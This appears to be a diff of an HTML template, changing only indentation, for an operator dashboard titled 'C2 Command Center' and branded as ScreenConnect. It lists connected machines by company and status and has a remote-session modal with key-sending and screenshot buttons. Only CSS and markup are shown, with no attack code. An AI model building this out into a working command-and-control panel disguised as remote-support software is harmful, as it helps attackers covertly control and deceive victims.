@@ -408,898 +408,897 @@ const adminHTML = `
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C2 Command Center</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
-    <style>
-        :root {
-            --bg-base: #080b12;
-            --bg-surface: #0f1523;
-            --bg-surface-hover: #182033;
-            --bg-glass: rgba(15, 21, 35, 0.7);
-            --text-main: #e2e8f0;
-            --text-muted: #64748b;
-            --accent: #0ea5e9;
-            --accent-glow: rgba(14, 165, 233, 0.4);
-            --success: #10b981;
-            --success-glow: rgba(16, 185, 129, 0.3);
-            --border: #1e293b;
-            --border-light: rgba(255, 255, 255, 0.05);
-        }
-
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-
-        body {
-            background-color: var(--bg-base);
-            color: var(--text-main);
-            display: flex;
-            height: 100vh;
-            overflow: hidden;
-            background-image:
-                radial-gradient(circle at 15% 50%, rgba(14, 165, 233, 0.05), transparent 25%),
-                radial-gradient(circle at 85% 30%, rgba(16, 185, 129, 0.03), transparent 25%);
-        }
-
-        .sidebar {
-            width: 260px;
-            background-color: var(--bg-glass);
-            backdrop-filter: blur(12px);
-            border-right: 1px solid var(--border-light);
-            display: flex;
-            flex-direction: column;
-            padding: 24px 0;
-            z-index: 10;
-        }
-
-        .logo-area {
-            padding: 0 24px 32px 24px;
-            font-size: 1.25rem;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            color: #fff;
-        }
-
-        .logo-area i {
-            color: var(--accent);
-            font-size: 1.4rem;
-            filter: drop-shadow(0 0 8px var(--accent-glow));
-        }
-
-        .nav-menu {
-            flex: 1;
-            overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-            gap: 4px;
-            padding: 0 12px;
-        }
-
-        .nav-item {
-            padding: 12px 16px;
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            color: var(--text-muted);
-            cursor: pointer;
-            transition: all 0.2s ease;
-            text-decoration: none;
-            font-size: 0.9rem;
-            font-weight: 500;
-            border-radius: 8px;
-            position: relative;
-        }
-
-        .nav-item:hover {
-            background-color: var(--bg-surface-hover);
-            color: var(--text-main);
-        }
-
-        .nav-item.active {
-            background: linear-gradient(90deg, rgba(14, 165, 233, 0.15) 0%, transparent 100%);
-            color: var(--accent);
-            border-left: 3px solid var(--accent);
-            border-radius: 4px 8px 8px 4px;
-        }
-
-        .nav-item i {
-            width: 20px;
-            text-align: center;
-            font-size: 1.1rem;
-        }
-
-        .build-btn-container {
-            padding: 24px;
-            border-top: 1px solid var(--border-light);
-        }
-
-        .build-btn {
-            width: 100%;
-            padding: 12px;
-            background: linear-gradient(135deg, var(--accent), #0284c7);
-            color: #fff;
-            border: none;
-            border-radius: 8px;
-            font-weight: 600;
-            font-size: 0.9rem;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 8px;
-            box-shadow: 0 4px 12px var(--accent-glow);
-        }
-
-        .build-btn:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 6px 16px var(--accent-glow);
-        }
-
-        .main-content {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-            position: relative;
-        }
-
-        .top-header {
-            height: 72px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 32px;
-            border-bottom: 1px solid var(--border-light);
-            background-color: var(--bg-glass);
-            backdrop-filter: blur(12px);
-            z-index: 5;
-        }
-
-        .search-bar {
-            display: flex;
-            align-items: center;
-            background-color: var(--bg-surface);
-            border: 1px solid var(--border-light);
-            border-radius: 8px;
-            padding: 10px 16px;
-            width: 380px;
-            transition: all 0.3s ease;
-        }
-
-        .search-bar:focus-within {
-            border-color: var(--accent);
-            box-shadow: 0 0 0 3px var(--accent-glow);
-        }
-
-        .search-bar i {
-            color: var(--text-muted);
-            margin-right: 12px;
-        }
-
-        .search-bar input {
-            background: transparent;
-            border: none;
-            color: var(--text-main);
-            width: 100%;
-            outline: none;
-            font-size: 0.9rem;
-        }
-
-        .header-actions {
-            display: flex;
-            gap: 24px;
-            color: var(--text-muted);
-            font-size: 1.1rem;
-        }
-
-        .header-actions i {
-            cursor: pointer;
-            transition: color 0.2s;
-        }
-
-        .header-actions i:hover {
-            color: var(--text-main);
-        }
-
-        .content-body {
-            padding: 32px;
-            overflow-y: auto;
-            flex: 1;
-        }
-
-        .page-title {
-            font-size: 1.6rem;
-            font-weight: 600;
-            margin-bottom: 24px;
-            letter-spacing: -0.5px;
-        }
-
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-            gap: 20px;
-            margin-bottom: 32px;
-        }
-
-        .stat-card {
-            background-color: var(--bg-surface);
-            border: 1px solid var(--border-light);
-            border-radius: 12px;
-            padding: 24px;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            position: relative;
-            overflow: hidden;
-            transition: transform 0.2s;
-        }
-
-        .stat-card:hover {
-            transform: translateY(-2px);
-            border-color: rgba(255,255,255,0.1);
-        }
-
-        .stat-card::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 2px;
-            background: linear-gradient(90deg, transparent, var(--border-light), transparent);
-        }
-
-        .stat-card .title {
-            color: var(--text-muted);
-            font-size: 0.8rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            font-weight: 600;
-        }
-
-        .stat-card .value {
-            font-size: 2.2rem;
-            font-weight: 700;
-        }
-
-        .stat-card .value.online { color: var(--success); text-shadow: 0 0 12px var(--success-glow); }
-        .stat-card .value.accent { color: var(--accent); text-shadow: 0 0 12px var(--accent-glow); }
-
-        .data-panel {
-            background-color: var(--bg-surface);
-            border: 1px solid var(--border-light);
-            border-radius: 12px;
-            overflow: hidden;
-        }
-
-        .panel-header {
-            padding: 20px 24px;
-            border-bottom: 1px solid var(--border-light);
-            font-weight: 600;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background: rgba(255,255,255,0.01);
-        }
-
-        .table-header {
-            display: grid;
-            grid-template-columns: 60px 2fr 2fr 1fr;
-            padding: 16px 24px;
-            background-color: rgba(0, 0, 0, 0.2);
-            color: var(--text-muted);
-            font-size: 0.75rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            font-weight: 600;
-            border-bottom: 1px solid var(--border-light);
-        }
-
-        .table-row {
-            display: grid;
-            grid-template-columns: 60px 2fr 2fr 1fr;
-            padding: 18px 24px;
-            border-bottom: 1px solid var(--border-light);
-            align-items: center;
-            transition: all 0.2s ease;
-            cursor: pointer;
-        }
-
-        .table-row:hover {
-            background-color: var(--bg-surface-hover);
-            transform: scale(1.002);
-        }
-
-        .table-row:last-child {
-            border-bottom: none;
-        }
-
-        .custom-checkbox {
-            width: 20px;
-            height: 20px;
-            border: 2px solid var(--text-muted);
-            border-radius: 6px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            transition: all 0.2s;
-        }
-
-        .table-row:hover .custom-checkbox {
-            border-color: var(--accent);
-        }
-
-        .machine-info {
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-        }
-
-        .machine-info .name {
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            color: #fff;
-        }
-
-        .machine-info .name i {
-            color: var(--accent);
-            font-size: 1.1rem;
-        }
-
-        .machine-info .company {
-            font-size: 0.8rem;
-            color: var(--text-muted);
-        }
-
-        .status {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 0.9rem;
-            font-weight: 500;
-        }
-
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-        }
-
-        .status-dot.online {
-            background-color: var(--success);
-            box-shadow: 0 0 10px var(--success);
-        }
-
-        .status-dot.offline {
-            background-color: var(--text-muted);
-        }
-
-        .modal-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100vw; height: 100vh;
-            background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(8px);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.3s ease;
-        }
-
-        .modal-overlay.active {
-            opacity: 1;
-            pointer-events: all;
-        }
-
-        .session-container {
-            width: 85vw;
-            height: 85vh;
-            background: #000;
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), 0 0 0 1px var(--border-light);
-            transform: scale(0.95);
-            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        .modal-overlay.active .session-container {
-            transform: scale(1);
-        }
-
-        .session-toolbar {
-            height: 50px;
-            background: #0f1523;
-            border-bottom: 1px solid var(--border-light);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 20px;
-        }
-
-        .session-title {
-            font-size: 0.9rem;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .session-title .dot {
-            width: 8px; height: 8px;
-            background: var(--success);
-            border-radius: 50%;
-            box-shadow: 0 0 8px var(--success);
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 var(--success-glow); }
-            70% { box-shadow: 0 0 0 6px transparent; }
-            100% { box-shadow: 0 0 0 0 transparent; }
-        }
-
-        .session-actions {
-            display: flex;
-            gap: 12px;
-        }
-
-        .tool-btn {
-            background: rgba(255,255,255,0.05);
-            border: 1px solid var(--border-light);
-            color: var(--text-main);
-            width: 32px; height: 32px;
-            border-radius: 6px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .tool-btn:hover {
-            background: rgba(255,255,255,0.1);
-        }
-
-        .tool-btn.end-session {
-            color: #ef4444;
-            background: rgba(239, 68, 68, 0.1);
-            border-color: rgba(239, 68, 68, 0.2);
-            width: auto;
-            padding: 0 12px;
-            font-size: 0.8rem;
-            font-weight: 600;
-            gap: 6px;
-        }
-
-        .tool-btn.end-session:hover {
-            background: rgba(239, 68, 68, 0.2);
-        }
-
-        .video-screen {
-            flex: 1;
-            background: #020617;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            position: relative;
-            overflow: hidden;
-            background-image:
-                radial-gradient(circle at center, #1e293b 0%, #020617 100%);
-        }
-
-        .connecting-state {
-            text-align: center;
-            color: var(--text-main);
-        }
-
-        .connecting-state i {
-            font-size: 3rem;
-            color: var(--accent);
-            margin-bottom: 20px;
-            animation: spin 2s linear infinite;
-        }
-
-        @keyframes spin {
-            100% { transform: rotate(360deg); }
-        }
-
-        .connecting-state h2 {
-            font-weight: 500;
-            margin-bottom: 8px;
-        }
-
-        .connecting-state p {
-            color: var(--text-muted);
-            font-size: 0.9rem;
-        }
-
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: var(--bg-base); }
-        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
-        ::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
-    </style>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>C2 Command Center</title>
+ <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+ <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+ <style>
+ :root {
+ --bg-base: #080b12;
+ --bg-surface: #0f1523;
+ --bg-surface-hover: #182033;
+ --bg-glass: rgba(15, 21, 35, 0.7);
+ --text-main: #e2e8f0;
+ --text-muted: #64748b;
+ --accent: #0ea5e9;
+ --accent-glow: rgba(14, 165, 233, 0.4);
+ --success: #10b981;
+ --success-glow: rgba(16, 185, 129, 0.3);
+ --border: #1e293b;
+ --border-light: rgba(255, 255, 255, 0.05);
+ }
+
+ * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+
+ body {
+ background-color: var(--bg-base);
+ color: var(--text-main);
+ display: flex;
+ height: 100vh;
+ overflow: hidden;
+ background-image:
+ radial-gradient(circle at 15% 50%, rgba(14, 165, 233, 0.05), transparent 25%),
+ radial-gradient(circle at 85% 30%, rgba(16, 185, 129, 0.03), transparent 25%);
+ }
+
+ .sidebar {
+ width: 260px;
+ background-color: var(--bg-glass);
+ backdrop-filter: blur(12px);
+ border-right: 1px solid var(--border-light);
+ display: flex;
+ flex-direction: column;
+ padding: 24px 0;
+ z-index: 10;
+ }
+
+ .logo-area {
+ padding: 0 24px 32px 24px;
+ font-size: 1.25rem;
+ font-weight: 700;
+ letter-spacing: -0.5px;
+ display: flex;
+ align-items: center;
+ gap: 12px;
+ color: #fff;
+ }
+
+ .logo-area i {
+ color: var(--accent);
+ font-size: 1.4rem;
+ filter: drop-shadow(0 0 8px var(--accent-glow));
+ }
+
+ .nav-menu {
+ flex: 1;
+ overflow-y: auto;
+ display: flex;
+ flex-direction: column;
+ gap: 4px;
+ padding: 0 12px;
+ }
+
+ .nav-item {
+ padding: 12px 16px;
+ display: flex;
+ align-items: center;
+ gap: 14px;
+ color: var(--text-muted);
+ cursor: pointer;
+ transition: all 0.2s ease;
+ text-decoration: none;
+ font-size: 0.9rem;
+ font-weight: 500;
+ border-radius: 8px;
+ position: relative;
+ }
+
+ .nav-item:hover {
+ background-color: var(--bg-surface-hover);
+ color: var(--text-main);
+ }
+
+ .nav-item.active {
+ background: linear-gradient(90deg, rgba(14, 165, 233, 0.15) 0%, transparent 100%);
+ color: var(--accent);
+ border-left: 3px solid var(--accent);
+ border-radius: 4px 8px 8px 4px;
+ }
+
+ .nav-item i {
+ width: 20px;
+ text-align: center;
+ font-size: 1.1rem;
+ }
+
+ .build-btn-container {
+ padding: 24px;
+ border-top: 1px solid var(--border-light);
+ }
+
+ .build-btn {
+ width: 100%;
+ padding: 12px;
+ background: linear-gradient(135deg, var(--accent), #0284c7);
+ color: #fff;
+ border: none;
+ border-radius: 8px;
+ font-weight: 600;
+ font-size: 0.9rem;
+ cursor: pointer;
+ transition: all 0.3s ease;
+ display: flex;
+ justify-content: center;
+ align-items: center;
+ gap: 8px;
+ box-shadow: 0 4px 12px var(--accent-glow);
+ }
+
+ .build-btn:hover {
+ transform: translateY(-1px);
+ box-shadow: 0 6px 16px var(--accent-glow);
+ }
+
+ .main-content {
+ flex: 1;
+ display: flex;
+ flex-direction: column;
+ overflow: hidden;
+ position: relative;
+ }
+
+ .top-header {
+ height: 72px;
+ display: flex;
+ align-items: center;
+ justify-content: space-between;
+ padding: 0 32px;
+ border-bottom: 1px solid var(--border-light);
+ background-color: var(--bg-glass);
+ backdrop-filter: blur(12px);
+ z-index: 5;
+ }
+
+ .search-bar {
+ display: flex;
+ align-items: center;
+ background-color: var(--bg-surface);
+ border: 1px solid var(--border-light);
+ border-radius: 8px;
+ padding: 10px 16px;
+ width: 380px;
+ transition: all 0.3s ease;
+ }
+
+ .search-bar:focus-within {
+ border-color: var(--accent);
+ box-shadow: 0 0 0 3px var(--accent-glow);
+ }
+
+ .search-bar i {
+ color: var(--text-muted);
+ margin-right: 12px;
+ }
+
+ .search-bar input {
+ background: transparent;
+ border: none;
+ color: var(--text-main);
+ width: 100%;
+ outline: none;
+ font-size: 0.9rem;
+ }
+
+ .header-actions {
+ display: flex;
+ gap: 24px;
+ color: var(--text-muted);
+ font-size: 1.1rem;
+ }
+
+ .header-actions i {
+ cursor: pointer;
+ transition: color 0.2s;
+ }
+
+ .header-actions i:hover {
+ color: var(--text-main);
+ }
+
+ .content-body {
+ padding: 32px;
+ overflow-y: auto;
+ flex: 1;
+ }
+
+ .page-title {
+ font-size: 1.6rem;
+ font-weight: 600;
+ margin-bottom: 24px;
+ letter-spacing: -0.5px;
+ }
+
+ .stats-grid {
+ display: grid;
+ grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+ gap: 20px;
+ margin-bottom: 32px;
+ }
+
+ .stat-card {
+ background-color: var(--bg-surface);
+ border: 1px solid var(--border-light);
+ border-radius: 12px;
+ padding: 24px;
+ display: flex;
+ flex-direction: column;
+ gap: 12px;
+ position: relative;
+ overflow: hidden;
+ transition: transform 0.2s;
+ }
+
+ .stat-card:hover {
+ transform: translateY(-2px);
+ border-color: rgba(255,255,255,0.1);
+ }
+
+ .stat-card::before {
+ content: '';
+ position: absolute;
+ top: 0; left: 0; width: 100%; height: 2px;
+ background: linear-gradient(90deg, transparent, var(--border-light), transparent);
+ }
+
+ .stat-card .title {
+ color: var(--text-muted);
+ font-size: 0.8rem;
+ text-transform: uppercase;
+ letter-spacing: 1px;
+ font-weight: 600;
+ }
+
+ .stat-card .value {
+ font-size: 2.2rem;
+ font-weight: 700;
+ }
+
+ .stat-card .value.online { color: var(--success); text-shadow: 0 0 12px var(--success-glow); }
+ .stat-card .value.accent { color: var(--accent); text-shadow: 0 0 12px var(--accent-glow); }
+
+ .data-panel {
+ background-color: var(--bg-surface);
+ border: 1px solid var(--border-light);
+ border-radius: 12px;
+ overflow: hidden;
+ }
+
+ .panel-header {
+ padding: 20px 24px;
+ border-bottom: 1px solid var(--border-light);
+ font-weight: 600;
+ display: flex;
+ justify-content: space-between;
+ align-items: center;
+ background: rgba(255,255,255,0.01);
+ }
+
+ .table-header {
+ display: grid;
+ grid-template-columns: 60px 2fr 2fr 1fr;
+ padding: 16px 24px;
+ background-color: rgba(0, 0, 0, 0.2);
+ color: var(--text-muted);
+ font-size: 0.75rem;
+ text-transform: uppercase;
+ letter-spacing: 1px;
+ font-weight: 600;
+ border-bottom: 1px solid var(--border-light);
+ }
+
+ .table-row {
+ display: grid;
+ grid-template-columns: 60px 2fr 2fr 1fr;
+ padding: 18px 24px;
+ border-bottom: 1px solid var(--border-light);
+ align-items: center;
+ transition: all 0.2s ease;
+ cursor: pointer;
+ }
+
+ .table-row:hover {
+ background-color: var(--bg-surface-hover);
+ transform: scale(1.002);
+ }
+
+ .table-row:last-child {
+ border-bottom: none;
+ }
+
+ .custom-checkbox {
+ width: 20px;
+ height: 20px;
+ border: 2px solid var(--text-muted);
+ border-radius: 6px;
+ display: flex;
+ justify-content: center;
+ align-items: center;
+ transition: all 0.2s;
+ }
+
+ .table-row:hover .custom-checkbox {
+ border-color: var(--accent);
+ }
+
+ .machine-info {
+ display: flex;
+ flex-direction: column;
+ gap: 6px;
+ }
+
+ .machine-info .name {
+ font-weight: 500;
+ display: flex;
+ align-items: center;
+ gap: 10px;
+ color: #fff;
+ }
+
+ .machine-info .name i {
+ color: var(--accent);
+ font-size: 1.1rem;
+ }
+
+ .machine-info .company {
+ font-size: 0.8rem;
+ color: var(--text-muted);
+ }
+
+ .status {
+ display: flex;
+ align-items: center;
+ gap: 10px;
+ font-size: 0.9rem;
+ font-weight: 500;
+ }
+
+ .status-dot {
+ width: 8px;
+ height: 8px;
+ border-radius: 50%;
+ }
+
+ .status-dot.online {
+ background-color: var(--success);
+ box-shadow: 0 0 10px var(--success);
+ }
+
+ .status-dot.offline {
+ background-color: var(--text-muted);
+ }
+
+ .modal-overlay {
+ position: fixed;
+ top: 0; left: 0; width: 100vw; height: 100vh;
+ background: rgba(0, 0, 0, 0.8);
+ backdrop-filter: blur(8px);
+ display: flex;
+ justify-content: center;
+ align-items: center;
+ z-index: 1000;
+ opacity: 0;
+ pointer-events: none;
+ transition: opacity 0.3s ease;
+ }
+
+ .modal-overlay.active {
+ opacity: 1;
+ pointer-events: all;
+ }
+
+ .session-container {
+ width: 85vw;
+ height: 85vh;
+ background: #000;
+ border: 1px solid var(--border);
+ border-radius: 12px;
+ display: flex;
+ flex-direction: column;
+ overflow: hidden;
+ box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), 0 0 0 1px var(--border-light);
+ transform: scale(0.95);
+ transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+ }
+
+ .modal-overlay.active .session-container {
+ transform: scale(1);
+ }
+
+ .session-toolbar {
+ height: 50px;
+ background: #0f1523;
+ border-bottom: 1px solid var(--border-light);
+ display: flex;
+ align-items: center;
+ justify-content: space-between;
+ padding: 0 20px;
+ }
+
+ .session-title {
+ font-size: 0.9rem;
+ font-weight: 500;
+ display: flex;
+ align-items: center;
+ gap: 10px;
+ }
+
+ .session-title .dot {
+ width: 8px; height: 8px;
+ background: var(--success);
+ border-radius: 50%;
+ box-shadow: 0 0 8px var(--success);
+ animation: pulse 2s infinite;
+ }
+
+ @keyframes pulse {
+ 0% { box-shadow: 0 0 0 0 var(--success-glow); }
+ 70% { box-shadow: 0 0 0 6px transparent; }
+ 100% { box-shadow: 0 0 0 0 transparent; }
+ }
+
+ .session-actions {
+ display: flex;
+ gap: 12px;
+ }
+
+ .tool-btn {
+ background: rgba(255,255,255,0.05);
+ border: 1px solid var(--border-light);
+ color: var(--text-main);
+ width: 32px; height: 32px;
+ border-radius: 6px;
+ display: flex;
+ justify-content: center;
+ align-items: center;
+ cursor: pointer;
+ transition: all 0.2s;
+ }
+
+ .tool-btn:hover {
+ background: rgba(255,255,255,0.1);
+ }
+
+ .tool-btn.end-session {
+ color: #ef4444;
+ background: rgba(239, 68, 68, 0.1);
+ border-color: rgba(239, 68, 68, 0.2);
+ width: auto;
+ padding: 0 12px;
+ font-size: 0.8rem;
+ font-weight: 600;
+ gap: 6px;
+ }
+
+ .tool-btn.end-session:hover {
+ background: rgba(239, 68, 68, 0.2);
+ }
+
+ .video-screen {
+ flex: 1;
+ background: #020617;
+ display: flex;
+ justify-content: center;
+ align-items: center;
+ position: relative;
+ overflow: hidden;
+ background-image:
+ radial-gradient(circle at center, #1e293b 0%, #020617 100%);
+ }
+
+ .connecting-state {
+ text-align: center;
+ color: var(--text-main);
+ }
+
+ .connecting-state i {
+ font-size: 3rem;
+ color: var(--accent);
+ margin-bottom: 20px;
+ animation: spin 2s linear infinite;
+ }
+
+ @keyframes spin {
+ 100% { transform: rotate(360deg); }
+ }
+
+ .connecting-state h2 {
+ font-weight: 500;
+ margin-bottom: 8px;
+ }
+
+ .connecting-state p {
+ color: var(--text-muted);
+ font-size: 0.9rem;
+ }
+
+ ::-webkit-scrollbar { width: 8px; }
+ ::-webkit-scrollbar-track { background: var(--bg-base); }
+ ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+ ::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
+ </style>
 </head>
 <body>
 
-    <!-- Sidebar -->
-    <aside class="sidebar">
-        <div class="logo-area">
-            <i class="fa-solid fa-layer-group"></i> ScreenConnect
-        </div>
-        <div class="nav-menu">
-            <a href="#" class="nav-item active"><i class="fa-solid fa-desktop"></i> Machines</a>
-            <a href="#" class="nav-item"><i class="fa-solid fa-users"></i> Users</a>
-            <a href="#" class="nav-item"><i class="fa-solid fa-network-wired"></i> Networks</a>
-            <a href="#" class="nav-item"><i class="fa-solid fa-chart-pie"></i> Analytics</a>
-            <a href="#" class="nav-item"><i class="fa-solid fa-gear"></i> Settings</a>
-        </div>
-        <div class="build-btn-container">
-            <button class="build-btn" onclick="openNewSession()">
-                <i class="fa-solid fa-plus"></i> New Session
-            </button>
-        </div>
-    </aside>
+ <!-- Sidebar -->
+ <aside class="sidebar">
+ <div class="logo-area">
+ <i class="fa-solid fa-layer-group"></i> ScreenConnect
+ </div>
+ <div class="nav-menu">
+ <a href="#" class="nav-item active"><i class="fa-solid fa-desktop"></i> Machines</a>
+ <a href="#" class="nav-item"><i class="fa-solid fa-users"></i> Users</a>
+ <a href="#" class="nav-item"><i class="fa-solid fa-network-wired"></i> Networks</a>
+ <a href="#" class="nav-item"><i class="fa-solid fa-chart-pie"></i> Analytics</a>
+ <a href="#" class="nav-item"><i class="fa-solid fa-gear"></i> Settings</a>
+ </div>
+ <div class="build-btn-container">
+ <button class="build-btn" onclick="openNewSession()">
+ <i class="fa-solid fa-plus"></i> New Session
+ </button>
+ </div>
+ </aside>
 
-    <!-- Main Content -->
-    <main class="main-content">
+ <!-- Main Content -->
+ <main class="main-content">
 
-        <!-- Header -->
-        <header class="top-header">
-            <div class="search-bar">
-                <i class="fa-solid fa-magnifying-glass"></i>
-                <input type="text" placeholder="Search connected machines..." id="searchInput" onkeyup="filterTable()">
-            </div>
-            <div class="header-actions">
-                <i class="fa-regular fa-bell"></i>
-                <i class="fa-regular fa-circle-question"></i>
-                <div style="width: 32px; height: 32px; border-radius: 50%; background: var(--accent); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 0.8rem; cursor: pointer;">
-                    JD
-                </div>
-            </div>
-        </header>
+ <!-- Header -->
+ <header class="top-header">
+ <div class="search-bar">
+ <i class="fa-solid fa-magnifying-glass"></i>
+ <input type="text" placeholder="Search connected machines..." id="searchInput" onkeyup="filterTable()">
+ </div>
+ <div class="header-actions">
+ <i class="fa-regular fa-bell"></i>
+ <i class="fa-regular fa-circle-question"></i>
+ <div style="width: 32px; height: 32px; border-radius: 50%; background: var(--accent); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 0.8rem; cursor: pointer;">
+ JD
+ </div>
+ </div>
+ </header>
 
-        <!-- Dashboard Body -->
-        <div class="content-body">
-            <h1 class="page-title">Guest Connected</h1>
+ <!-- Dashboard Body -->
+ <div class="content-body">
+ <h1 class="page-title">Guest Connected</h1>
 
-            <!-- Stats Row -->
-            <div class="stats-grid">
-                <div class="stat-card">
-                    <span class="title">Total Users</span>
-                    <span class="value" id="totalUsers">0</span>
-                </div>
-                <div class="stat-card">
-                    <span class="title">Currently Online</span>
-                    <span class="value online" id="onlineUsers">0</span>
-                </div>
-                <div class="stat-card">
-                    <span class="title">Offline</span>
-                    <span class="value" id="offlineUsers">0</span>
-                </div>
-                <div class="stat-card">
-                    <span class="title">Active Sessions</span>
-                    <span class="value accent" id="activeSessions">0</span>
-                </div>
-            </div>
+ <!-- Stats Row -->
+ <div class="stats-grid">
+ <div class="stat-card">
+ <span class="title">Total Users</span>
+ <span class="value" id="totalUsers">0</span>
+ </div>
+ <div class="stat-card">
+ <span class="title">Currently Online</span>
+ <span class="value online" id="onlineUsers">0</span>
+ </div>
+ <div class="stat-card">
+ <span class="title">Offline</span>
+ <span class="value" id="offlineUsers">0</span>
+ </div>
+ <div class="stat-card">
+ <span class="title">Active Sessions</span>
+ <span class="value accent" id="activeSessions">0</span>
+ </div>
+ </div>
 
-            <!-- Data Table -->
-            <div class="data-panel">
-                <div class="panel-header">
-                    <span>Computer Directory</span>
-                    <i class="fa-solid fa-filter" style="cursor: pointer; color: var(--text-muted);"></i>
-                </div>
+ <!-- Data Table -->
+ <div class="data-panel">
+ <div class="panel-header">
+ <span>Computer Directory</span>
+ <i class="fa-solid fa-filter" style="cursor: pointer; color: var(--text-muted);"></i>
+ </div>
 
-                <div class="table-header">
-                    <div></div>
-                    <div>Computer Name</div>
-                    <div>Company</div>
-                    <div>Status</div>
-                </div>
+ <div class="table-header">
+ <div></div>
+ <div>Computer Name</div>
+ <div>Company</div>
+ <div>Status</div>
+ </div>
 
-                <div id="table-body">
-                    <!-- Rows will be populated by JS -->
-                </div>
-            </div>
-        </div>
-    </main>
+ <div id="table-body">
+ <!-- Rows will be populated by JS -->
+ </div>
+ </div>
+ </div>
+ </main>
 
-    <!-- REMOTE SESSION MODAL -->
-    <div class="modal-overlay" id="sessionModal" onclick="closeSession(event)">
-        <div class="session-container" onclick="event.stopPropagation()">
+ <!-- REMOTE SESSION MODAL -->
+ <div class="modal-overlay" id="sessionModal" onclick="closeSession(event)">
+ <div class="session-container" onclick="event.stopPropagation()">
 
-            <!-- Modal Toolbar -->
-            <div class="session-toolbar">
-                <div class="session-title">
-                    <div class="dot"></div>
-                    <span id="modalMachineName">Connecting...</span>
-                </div>
-                <div class="session-actions">
-                    <button class="tool-btn" title="Full Screen"><i class="fa-solid fa-expand"></i></button>
-                    <button class="tool-btn" title="Send Keys"><i class="fa-solid fa-keyboard"></i></button>
-                    <button class="tool-btn" title="Screenshot"><i class="fa-solid fa-camera"></i></button>
-                    <button class="tool-btn end-session" onclick="closeSession(event)">
-                        <i class="fa-solid fa-power-off"></i> End Session
-                    </button>
-                </div>
-            </div>
+ <!-- Modal Toolbar -->
+ <div class="session-toolbar">
+ <div class="session-title">
+ <div class="dot"></div>
+ <span id="modalMachineName">Connecting...</span>
+ </div>
+ <div class="session-actions">
+ <button class="tool-btn" title="Full Screen"><i class="fa-solid fa-expand"></i></button>
+ <button class="tool-btn" title="Send Keys"><i class="fa-solid fa-keyboard"></i></button>
+ <button class="tool-btn" title="Screenshot"><i class="fa-solid fa-camera"></i></button>
+ <button class="tool-btn end-session" onclick="closeSession(event)">
+ <i class="fa-solid fa-power-off"></i> End Session
+ </button>
+ </div>
+ </div>
 
-            <!-- Modal Video Screen -->
-            <div class="video-screen">
-                <!-- Connecting State -->
-                <div class="connecting-state" id="connectingState">
-                    <i class="fa-solid fa-circle-notch"></i>
-                    <h2>Establishing Secure Connection</h2>
-                    <p>Handshaking with remote machine...</p>
-                </div>
+ <!-- Modal Video Screen -->
+ <div class="video-screen">
+ <!-- Connecting State -->
+ <div class="connecting-state" id="connectingState">
+ <i class="fa-solid fa-circle-notch"></i>
+ <h2>Establishing Secure Connection</h2>
+ <p>Handshaking with remote machine...</p>
+ </div>
 
-                <!-- Actual Remote Desktop Video -->
